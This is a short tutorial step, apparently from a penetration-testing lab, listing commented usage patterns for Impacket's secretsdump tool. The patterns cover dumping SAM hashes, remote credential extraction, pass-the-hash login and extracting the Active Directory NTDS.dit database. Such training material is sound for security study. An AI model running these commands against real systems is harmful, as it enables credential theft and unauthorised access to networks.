Step 3: Practice secretsdump Commands
Common secretsdump usage patterns:

# Local SAM database extraction (requires SYSTEM and SAM hives)
# python3 examples/secretsdump.py -sam SAM -system SYSTEM LOCAL

# Remote credential extraction with credentials
# python3 examples/secretsdump.py DOMAIN/username:password@target_ip

# Pass-the-hash authentication
# python3 examples/secretsdump.py -hashes :NTLM_HASH DOMAIN/username@target_ip

# Extract NTDS.dit (Active Directory database)
# python3 examples/secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
